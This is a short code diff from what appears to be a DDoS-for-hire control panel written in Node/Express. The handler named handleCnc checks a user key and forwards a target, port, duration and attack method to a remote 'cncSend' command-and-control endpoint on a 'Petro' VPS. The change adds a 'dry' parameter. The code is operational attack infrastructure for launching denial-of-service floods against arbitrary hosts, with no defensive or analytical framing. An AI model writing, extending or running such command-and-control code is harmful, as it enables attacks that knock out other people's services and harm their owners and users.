@@ -554,7 +554,7 @@ app.post("/delServer", handleDelServer);
 async function handleCnc(req, res) {
   const pu = petroUser(req);
   if (!pu) return res.json({ valid: false, message: "invalid key" });
-  const r = await petroGet("/cncSend", { target: qp(req,"target"), port: qp(req,"port"), duration: qp(req,"duration"), ddos: qp(req,"ddos") });
+  const r = await petroGet("/cncSend", { target: qp(req,"target"), port: qp(req,"port"), duration: qp(req,"duration"), ddos: qp(req,"ddos"), dry: qp(req,"dry") });
   if (r.__offline) return res.json({ valid: true, sended: false, cooldown: false, message: "VPS Petro offline, coba lagi." });
   delete r.__status; res.json(r);
 }
